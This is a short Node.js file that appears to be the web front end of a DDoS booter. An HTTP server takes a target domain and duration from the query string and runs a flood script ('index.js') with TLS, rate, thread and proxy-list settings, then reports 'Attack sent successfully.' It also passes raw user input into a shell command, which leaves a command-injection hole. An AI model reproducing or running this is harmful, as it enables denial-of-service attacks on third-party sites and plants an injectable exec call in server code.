const http = require('http');
const url = require('url');
const { exec } = require('child_process');

const server = http.createServer((req, res) => {
  const query = url.parse(req.url, true).query;
  const domain = query.domain;
  const time = query.time;
  if(!domain || !time){
    res.end("Please specify a domain and time");
    return;
  }
  const command = `node index.js ${domain} ${time} TLSv2 100 15 GET 4 false proxy.txt 100`;
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    res.end('Attack sent successfully.');
  });
});

server.listen(8000);
